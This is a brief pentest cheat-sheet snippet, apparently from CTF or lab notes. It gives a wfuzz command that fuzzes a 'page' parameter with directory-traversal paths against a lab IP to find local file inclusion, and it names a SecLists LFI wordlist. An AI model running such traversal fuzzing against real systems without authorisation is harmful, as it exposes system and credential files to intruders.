Blind fuzz
```
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ


Seclist -> SecLists/Fuzzing/LFI/LFI-Jhaddix.txt

```
